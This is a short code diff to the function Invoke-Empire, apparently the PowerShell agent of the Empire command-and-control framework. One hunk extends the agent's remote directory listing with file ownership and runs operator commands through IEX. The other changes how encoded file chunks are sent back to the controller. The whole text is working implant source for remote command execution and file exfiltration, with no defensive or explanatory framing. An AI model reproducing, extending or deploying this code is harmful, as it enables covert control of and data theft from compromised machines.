@@ -281,11 +281,11 @@ function Invoke-Empire {
             switch -regex ($cmd) {
                 '(ls|dir)' {
                     if ($cmdargs.length -eq "") {
-                        $output = Get-ChildItem -force | select lastwritetime,length,name
+                        $output = Get-ChildItem -force | select mode,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }},lastwritetime,length,name
                     }
                     else {
                         try{
-                            $output = IEX "$cmd $cmdargs -Force -ErrorAction Stop | select lastwritetime,length,name"
+                            $output = IEX "$cmd $cmdargs -Force -ErrorAction Stop | select mode,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }},lastwritetime,length,name"
                         }
                         catch [System.Management.Automation.ActionPreferenceStopException] {
                             $output = "[!] Error: $_ (or cannot be accessed)."
@@ -850,7 +850,7 @@ function Invoke-Empire {
 
                         if($EncodedPart) {
                             $data = "{0}|{1}|{2}" -f $Index, $path, $EncodedPart
-                            Send-Message -Packets $(Encode-Packet -type $type -data $($data) -ResultID $ResultID)
+                            (& $SendMessage -Packets $(Encode-Packet -type $type -data $($data) -ResultID $ResultID))
                             $Index += 1
 
                             # if there are more parts of the file, sleep for the specified interval
